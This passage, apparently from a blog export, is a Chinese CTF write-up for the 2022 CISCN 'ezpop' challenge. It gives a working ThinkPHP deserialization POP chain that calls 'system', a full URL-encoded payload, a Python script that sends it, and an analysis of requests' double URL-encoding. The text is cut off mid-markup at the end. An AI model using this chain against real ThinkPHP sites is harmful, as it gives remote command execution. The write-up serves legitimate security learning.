A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D \"\n```\n\n## 源码分析\n\n跟进 `requests.Request`，可以看到如下代码：\n\n```python\ndef prepare_body(self, data, files, json=None):\n    \"\"\"Prepares the given HTTP body data.\"\"\"\n\n    # Check if file, fo, generator, iterator.\n    # If not, run through normal process.\n\n    # Nottin' on you.\n    body = None\n    content_type = None\n\n    if not data and json is not None:\n        # urllib3 requires a bytes-like body. Python 2's json.dumps\n        # provides this natively, but Python 3 gives a Unicode string.\n        content_type = \"application/json\"\n\n        try:\n            body = complexjson.dumps(json, allow_nan=False)\n        except ValueError as ve:\n            raise InvalidJSONError(ve, request=self)\n\n        if not isinstance(body, bytes):\n            body = body.encode(\"utf-8\")\n\n    is_stream = all(\n        [\n            hasattr(data, \"__iter__\"),\n            not isinstance(data, (basestring, list, tuple, Mapping)),\n        ]\n    )\n\n    if is_stream:\n        try:\n            length = super_len(data)\n        except (TypeError, AttributeError, UnsupportedOperation):\n            length = None\n\n        body = data\n\n        if getattr(body, \"tell\", None) is not None:\n            # Record the current file position before reading.\n            # This will allow us to rewind a file in the event\n            # of a redirect.\n            try:\n                self._body_position = body.tell()\n            except OSError:\n                # This differentiates from None, allowing us to catch\n                # a failed `tell()` later when trying to rewind the body\n                self._body_position = object()\n\n        if files:\n            raise NotImplementedError(\n                \"Streamed bodies and files are mutually exclusive.\"\n            )\n\n        if length:\n            self.headers[\"Content-Length\"] = builtin_str(length)\n        else:\n            self.headers[\"Transfer-Encoding\"] = \"chunked\"\n    else:\n        # Multi-part file uploads.\n        if files:\n            (body, content_type) = self._encode_files(files, data)\n        else:\n            if data:\n                body = self._encode_params(data)\n                if isinstance(data, basestring) or hasattr(data, \"read\"):\n                    content_type = None\n                else:\n                    content_type = \"application/x-www-form-urlencoded\"\n\n        self.prepare_content_length(body)\n\n        # Add content-type if it wasn't explicitly provided.\n        if content_type and (\"content-type\" not in self.headers):\n            self.headers[\"Content-Type\"] = content_type\n\n    self.body = body\n```\n\n可以看到，`data` 参数会被 `self._encode_params` 处理，再看 `self._encode_params`：\n\n```python\n@staticmethod\ndef _encode_params(data):\n    \"\"\"Encode parameters in a piece of data.\n\n    Will successfully encode parameters when passed as a dict or a list of\n    2-tuples. Order is retained if data is a list of 2-tuples but arbitrary\n    if parameters are supplied as a dict.\n    \"\"\"\n\n    if isinstance(data, (str, bytes)):\n        return data\n    elif hasattr(data, \"read\"):\n        return data\n    elif hasattr(data, \"__iter__\"):\n        result = []\n        for k, vs in to_key_val_list(data):\n            if isinstance(vs, basestring) or not hasattr(vs, \"__iter__\"):\n                vs = [vs]\n            for v in vs:\n                if v is not None:\n                    result.append(\n                        (\n                            k.encode(\"utf-8\") if isinstance(k, str) else k,\n                            v.encode(\"utf-8\") if isinstance(v, str) else v,\n                        )\n                    )\n        return urlencode(result, doseq=True)\n    else:\n        return data\n```\n\n其中\n","slug":"2022 CISCN - ezpop","published":1,"updated":"2024-06-07T03:13:30.287Z","comments":1,"layout":"post","photos":[],"_id":"clxa5zock00007slzhjt48vze","content":"<p>两年前的意难平。</p>\n<span id=\"more\"></span>\n<hr>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>当时 pop 链都找到了，就是打不通，hackbar 和 python 都不行，成了一个疙瘩，正好现在全面转 web 安全了，把这根刺拔了先。</p>\n<h2 id=\"题解\"><a href=\"#题解\" class=\"headerlink\" title=\"题解\"></a>题解</h2><p>最近渗透做多了，看到题目就想扫目录（<br>直接访问 <code>www.zip</code> 就能把源码下下来，看到 <code>app/controller/Index.php</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">app</span>\\<span class=\"title class_\">controller</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">app</span>\\<span class=\"title\">BaseController</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Index</span> <span class=\"keyword\">extends</span> <span class=\"title\">BaseController</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">index</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V&#x27;</span> . \\think\\facade<span class=\"title class_\">\\App</span>::<span class=\"title function_ invoke__\">version</span>() . <span class=\"string\">&#x27;&lt;br/&gt;&lt;span style=&quot;font-size:30px;&quot;&gt;14载初心不改 - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;span style=&quot;font-size:25px;&quot;&gt;[ V6.0 版本由 &lt;a href=&quot;https://www.yisu.com/&quot; target=&quot;yisu&quot;&gt;亿速云&lt;/a&gt; 独家赞助发布 ]&lt;/span&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;ee9b1aa918103c4fc&quot;&gt;&lt;/think&gt;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hello</span>(<span class=\"params\"><span class=\"variable\">$name</span> = <span class=\"string\">&#x27;ThinkPHP6&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;hello,&#x27;</span> . <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;a&#x27;</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可知路由为 <code>Index/test</code>，用 POST 传进参数 <code>a</code>，用这个 <a href=\"https://www.freebuf.com/vuls/321546.html\">PoC</a> 生成一个 payload，然后用 burp 发包，得到 flag。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">think</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">abstract</span> <span class=\"title class_\">class</span> <span class=\"title class_\">Model</span>&#123;</span><br><span class=\"line\">        <span class=\"title class_\">private</span> $<span class=\"title class_\">lazySave</span> = <span class=\"title class_\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"variable\">$data</span> = [];</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"variable\">$exists</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$table</span>;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"variable\">$withAttr</span> = [];</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$json</span> = [];</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$jsonAssoc</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$obj</span> = <span class=\"string\">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;lazySave = True;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;data = [<span class=\"string\">&#x27;whoami&#x27;</span> =&gt; [<span class=\"string\">&#x27;dir&#x27;</span>]];</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;exists = True;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;table = <span class=\"variable\">$obj</span>;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;withAttr = [<span class=\"string\">&#x27;whoami&#x27;</span> =&gt; [<span class=\"string\">&#x27;system&#x27;</span>]];</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;json = [<span class=\"string\">&#x27;whoami&#x27;</span>,[<span class=\"string\">&#x27;whoami&#x27;</span>]];</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;jsonAssoc = True;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">model</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">use</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">Model</span>;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Pivot</span> <span class=\"keyword\">extends</span> <span class=\"title\">Model</span></span>&#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> &#123;</span><br><span class=\"line\">    <span class=\"title class_\">echo</span>(<span class=\"title class_\">base64_encode</span>(<span class=\"title class_\">serialize</span>(<span class=\"title class_\">new</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">model</span>\\<span class=\"title class_\">Pivot</span>(<span class=\"title class_\">new</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">model</span>\\<span class=\"title class_\">Pivot</span>()))));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>payload 如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D </span><br></pre></td></tr></table></figure>\n\n<p>把 <code>dir</code> 换成 <code>cat /flag</code> 即可。</p>\n<p>现在分析为什么我当初用 python 不行，这是我的 python 代码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&#x27;&lt;url&gt;/Index/test&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;Content-Type&quot;</span>: <span class=\"string\">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">data = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;a&quot;</span>: <span class=\"string\">r&quot;O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">res = requests.post(url, data=data, headers=headers)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(res.text)</span><br></pre></td></tr></table></figure>\n\n<p><code>print(requests.Request(&#39;POST&#39;, url, data=data, headers=headers).prepare().body)</code> 查看请求体后发现 payload 长这样了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=O%253A17%253A%2522think%255Cmodel%255CPivot%2522%253A7%253A%257Bs%253A21%253A%2522%2500think%255CModel%2500lazySave%2522%253Bb%253A1%253Bs%253A17%253A%2522%2500think%255CModel%2500data%2522%253Ba%253A1%253A%257Bs%253A6%253A%2522whoami%2522%253Ba%253A1%253A%257Bi%253A0%253Bs%253A3%253A%2522dir%2522%253B%257D%257Ds%253A19%253A%2522%2500think%255CModel%2500exists%2522%253Bb%253A1%253Bs%253A8%253A%2522%2500%252A%2500table%2522%253BO%253A17%253A%2522think%255Cmodel%255CPivot%2522%253A7%253A%257Bs%253A21%253A%2522%2500think%255CModel%2500lazySave%2522%253Bb%253A1%253Bs%253A17%253A%2522%2500think%255CModel%2500data%2522%253Ba%253A1%253A%257Bs%253A6%253A%2522whoami%2522%253Ba%253A1%253A%257Bi%253A0%253Bs%253A3%253A%2522dir%2522%253B%257D%257Ds%253A19%253A%2522%2500think%255CModel%2500exists%2522%253Bb%253A1%253Bs%253A8%253A%2522%2500%252A%2500table%2522%253Bs%253A0%253A%2522%2522%253Bs%253A21%253A%2522%2500think%255CModel%2500withAttr%2522%253Ba%253A1%253A%257Bs%253A6%253A%2522whoami%2522%253Ba%253A1%253A%257Bi%253A0%253Bs%253A6%253A%2522system%2522%253B%257D%257Ds%253A7%253A%2522%2500%252A%2500json%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A6%253A%2522whoami%2522%253Bi%253A1%253Ba%253A1%253A%257Bi%253A0%253Bs%253A6%253A%2522whoami%2522%253B%257D%257Ds%253A12%253A%2522%2500%252A%2500jsonAssoc%2522%253Bb%253A1%253B%257Ds%253A21%253A%2522%2500think%255CModel%2500withAttr%2522%253Ba%253A1%253A%257Bs%253A6%253A%2522whoami%2522%253Ba%253A1%253A%257Bi%253A0%253Bs%253A6%253A%2522system%2522%253B%257D%257Ds%253A7%253A%2522%2500%252A%2500json%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A6%253A%2522whoami%2522%253Bi%253A1%253Ba%253A1%253A%257Bi%253A0%253Bs%253A6%253A%2522whoami%2522%253B%257D%257Ds%253A12%253A%2522%2500%252A%2500jsonAssoc%2522%253Bb%253A1%253B%257D</span><br></pre></td></tr></table></figure>\n\n<p>也就是说，它又被 urlencode 了一次，所以应该直接写成如下形式：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data = <span class=\"string\">&quot;a=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D &quot;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"源码分析\"><a href=\"#源码分析\" class=\"headerlink\" title=\"源码分析\"></a>源码分析</h2><p>跟进 <code>requests.Request</code>，可以看到如下代码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">prepare_body</span>(<span class=\"params\">self, data, files, json=<span class=\"literal\">None</span></span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;Prepares the given HTTP body data.&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># Check if file, fo, generator, iterator.</span></span><br><span class=\"line\">    <span class=\"comment\"># If not, run through normal process.</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># Nottin&#x27; on you.</span></span><br><span class=\"line\">    body = <span class=\"literal\">None</span></span><br><span class=\"line\">    content_type = <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> data <span class=\"keyword\">and</span> json <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"comment\"># urllib3 requires a bytes-like body. Python 2&#x27;s json.dumps</span></span><br><span class=\"line\">        <span class=\"comment\"># provides this natively, but Python 3 gives a Unicode string.</span></span><br><span class=\"line\">        content_type = <span class=\"string\">&quot;application/json&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            body = complexjson.dumps(json, allow_nan=<span class=\"literal\">False</span>)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> ValueError <span class=\"keyword\">as</span> ve:</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> InvalidJSONError(ve, request=self)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> <span class=\"built_in\">isinstance</span>(body, <span class=\"built_in\">bytes</span>):</span><br><span class=\"line\">            body = body.encode(<span class=\"string\">&quot;utf-8&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    is_stream = <span class=\"built_in\">all</span>(</span><br><span class=\"line\">        [</span><br><span class=\"line\">            <span class=\"built_in\">hasattr</span>(data, <span class=\"string\">&quot;__iter__&quot;</span>),</span><br><span class=\"line\">            <span class=\"keyword\">not</span> <span class=\"built_in\">isinstance</span>(data, (basestring, <span class=\"built_in\">list</span>, <span class=\"built_in\">tuple</span>, Mapping)),</span><br><span class=\"line\">        ]</span><br><span class=\"line\">    )</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> is_stream:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            length = super_len(data)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> (TypeError, AttributeError, UnsupportedOperation):</span><br><span class=\"line\">            length = <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\">        body = data</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">getattr</span>(body, <span class=\"string\">&quot;tell&quot;</span>, <span class=\"literal\">None</span>) <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">            <span class=\"comment\"># Record the current file position before reading.</span></span><br><span class=\"line\">            <span class=\"comment\"># This will allow us to rewind a file in the event</span></span><br><span class=\"line\">            <span class=\"comment\"># of a redirect.</span></span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                self._body_position = body.tell()</span><br><span class=\"line\">            <span class=\"keyword\">except</span> OSError:</span><br><span class=\"line\">                <span class=\"comment\"># This differentiates from None, allowing us to catch</span></span><br><span class=\"line\">                <span class=\"comment\"># a failed `tell()` later when trying to rewind the body</span></span><br><span class=\"line\">                self._body_position = <span class=\"built_in\">object</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> files:</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> NotImplementedError(</span><br><span 